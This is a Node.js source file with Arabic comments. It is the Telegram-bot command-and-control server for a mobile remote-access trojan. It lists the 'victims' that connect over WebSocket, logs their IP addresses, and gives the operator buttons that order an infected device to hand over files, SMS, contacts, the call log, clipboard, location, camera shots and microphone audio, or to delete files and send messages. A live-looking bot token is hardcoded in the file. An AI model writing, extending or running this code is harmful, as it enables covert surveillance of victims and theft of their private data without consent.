// --- (1) المكتبات الأساسية ---
const express = require("express");
const webSocket = require("ws");
const http = require("http");
const telegramBot = require("node-telegram-bot-api");
const uuid4 = require("uuid").v4;

// --- (2) الإعدادات الذهبية للمطور @A_l_k_w_r_y ---
const token = '8531140296:AAGGyJqPaVSiRWTEUbrG1fmEsfLHVWELV20';
const ADMIN_ID = 6568145373; 
const DEV_USER = "@A_l_k_w_r_y";

const app = express();
const server = http.createServer(app);
const wss = new webSocket.Server({ server });
const bot = new telegramBot(token, { polling: true });

let clients = [];
let allowedUsers = [ADMIN_ID]; // قائمة المسموح لهم باستخدام البوت

// --- (3) لوحة التحكم وإدارة الصلاحيات ---
bot.on("message", (msg) => {
    const id = msg.chat.id;
    const user = msg.from;
    const text = msg.text;

    // 1. نظام تعليق الغرباء (الموافقة اليدوية)
    if (!allowedUsers.includes(id)) {
        bot.sendMessage(ADMIN_ID, `🔔 <b>طلب دخول جديد!</b>\n\n👤 الاسم: <code>${user.first_name}</code>\n🆔 الايدي: <code>${id}</code>\n🔗 اليوزر: @${user.username || 'لا يوجد'}`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "✅ السماح له", callback_data: `allow_${id}` }, { text: "❌ حظر", callback_data: `block_${id}` }]
                ]
            }
        });
        return bot.sendMessage(id, "⏳ <b>وصولك معلق..</b>\nطلبك قيد المراجعة من قبل المطور @A_l_k_w_r_y");
    }

    // 2. أوامر المطور الرئيسي (أنت فقط)
    if (id === ADMIN_ID) {
        if (text === "/start") {
            bot.sendMessage(id, `👑 <b>لوحة تحكم الإمبراطور ( ${DEV_USER} )</b>\n\nالضحايا: <code>${clients.length}</code>\nالمستخدمين: <code>${allowedUsers.length - 1}</code>`, {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ["📱 عرض الضحايا", "👥 إدارة المستخدمين"],
                        ["🚫 طرد مستخدم بالايدي", "📢 إذاعة عامة"],
                        ["🔐 قفل البوت", "🔓 فتح البوت"]
                    ],
                    resize_keyboard: true
                }
            });
        }

        // ميزة الطرد عبر الايدي
        if (text === "🚫 طرد مستخدم بالايدي") {
            bot.sendMessage(id, "✍️ أرسل الآن (الايدي ID) للشخص المراد طرده:");
            bot.once("message", (reMsg) => {
                const targetId = parseInt(reMsg.text);
                if (targetId === ADMIN_ID) return bot.sendMessage(id, "❌ لا يمكنك طرد نفسك!");
                allowedUsers = allowedUsers.filter(u => u !== targetId);
                bot.sendMessage(id, `✅ تم طرد <code>${targetId}</code> بنجاح.`, {parse_mode: 'HTML'});
            });
        }

        if (text === "📱 عرض الضحايا") {
            if (clients.length === 0) return bot.sendMessage(id, "❌ لا يوجد ضحايا متصلين.");
            clients.forEach(c => {
                bot.sendMessage(id, `📍 جـهاز: <code>${c.id}</code>\n🌍 IP: <code>${c.ip}</code>`, {
                    parse_mode: 'HTML',
                    reply_markup: { inline_keyboard: [[{ text: "🎮 لوحة التحكم بالضحية", callback_data: `control_${c.id}` }]] }
                });
            });
        }
    }
});

// --- (4) معالجة الأزرار (السماح + لوحة الاختراق من الصورة) ---
bot.on("callback_query", (q) => {
    const [action, value] = q.data.split("_");

    if (action === "allow") {
        allowedUsers.push(parseInt(value));
        bot.sendMessage(value, "✅ تمت الموافقة! يمكنك استخدام البوت.");
        bot.answerCallbackQuery(q.id, { text: "تم السماح" });
    }

    // لوحة الاختراق المعربة (طبق الأصل من الصورة)
    if (action === "control") {
        const victimId = value;
        const controlButtons = {
            inline_keyboard: [
                [{ text: "📥 جلب ملف", callback_data: `getfile_${victimId}` }, { text: "🗑️ حذف ملف", callback_data: `delfile_${victimId}` }],
                [{ text: "📋 الحافظة (نسخ)", callback_data: `clip_${victimId}` }, { text: "🎙️ الميكروفون", callback_data: `mic_${victimId}` }],
                [{ text: "📸 كاميرا سيلفي", callback_data: `selfie_${victimId}` }, { text: "📸 كاميرا رئيسية", callback_data: `maincam_${victimId}` }],
                [{ text: "📍 الموقع الحالي", callback_data: `loc_${victimId}` }, { text: "💬 رسالة توست", callback_data: `toast_${victimId}` }],
                [{ text: "📞 سجل المكالمات", callback_data: `calls_${victimId}` }, { text: "👥 قائمة الأسماء", callback_data: `contacts_${victimId}` }],
                [{ text: "📳 اهتزاز الجهاز", callback_data: `vibrate_${victimId}` }, { text: "🔔 إظهار إشعار", callback_data: `notif_${victimId}` }],
                [{ text: "📩 سحب الرسائل", callback_data: `msgs_${victimId}` }, { text: "📤 إرسال رسالة", callback_data: `sendmsg_${victimId}` }],
                [{ text: "🎵 تشغيل صوت", callback_data: `play_${victimId}` }, { text: "🔇 إيقاف الصوت", callback_data: `stop_${victimId}` }],
                [{ text: "📢 إرسال للكل", callback_data: `msgall_${victimId}` }]
            ]
        };
        bot.sendMessage(ADMIN_ID, `⚠️ <b>لوحة السيطرة على الضحية:</b> <code>${victimId}</code>`, {
            parse_mode: 'HTML',
            reply_markup: controlButtons
        });
    }

    // إرسال الأوامر الفعلية للجهاز
    const target = clients.find(c => c.id === value);
    if (target && action !== "allow" && action !== "control") {
        target.ws.send(JSON.stringify({ cmd: action }));
        bot.answerCallbackQuery(q.id, { text: `🚀 جاري تنفيذ ${action}` });
    }
});

// --- (5) اتصال الضحايا الجدد ---
wss.on('connection', (ws, req) => {
    const deviceId = uuid4().substring(0, 8);
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    clients.push({ id: deviceId, ws: ws, ip: ip });

    bot.sendMessage(ADMIN_ID, `⚠️ <b>لقد اخترقت جهازاً بنجاح 🔥</b>\n🆔 ايدي الجهاز: <code>${deviceId}</code>\n🌍 IP: <code>${ip}</code>`, { parse_mode: 'HTML' });

    ws.on('close', () => { clients = clients.filter(c => c.id !== deviceId); });
});

server.listen(process.env.PORT || 3000, () => { console.log(`System Online for ${DEV_USER}`); });
